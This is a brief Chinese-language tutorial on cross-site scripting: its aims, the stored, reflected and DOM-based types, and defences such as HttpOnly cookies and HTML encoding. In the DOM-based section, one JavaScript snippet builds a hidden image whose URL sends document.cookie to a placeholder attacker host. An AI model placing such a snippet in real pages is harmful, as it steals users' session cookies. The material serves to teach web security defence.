## 常见web 安全

XSS跨站攻击







#### XSS 跨站攻击

xss 跨站攻击的目的是：`盗取用户Cookie`、`破坏页面结构`、`重定向到其它网站`

XSS 攻击可以分为3类：存储型（持久型）、反射型（非持久型）、DOM 型。





- **存储型 XSS**

  注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。

- **反射型 XSS**

  当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自"可信任"的服务器，所以会执行这段脚本。

- **基于 DOM 的 XSS**

  通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。

  ​	为 dom 元素中，添加一个 script，或是 iframe,img,a ，里对应的 src 或 href设置为恶意代码。如果我们点击 a，就会执行恶意代码。

  ```js
  var hakerImg = document.createElement('img');
  hakerImg.width = 0;
  hakerImg.height = 0;
  hakerImg.src ='http://www.a.com/?hacker='+encodeURIComponent(document.cookie);
  ```

  

## 防范

XSS Filters  

设置 Http Only cookie，请求 该cookie只能通过浏览器在发送 http 请求的时候带着头部。不允许 js 来操作。

#### Html encode

过滤掉html 的特殊字符：`“<”`,  `" "` ,` "&"` ,`">"`	,`'"'`

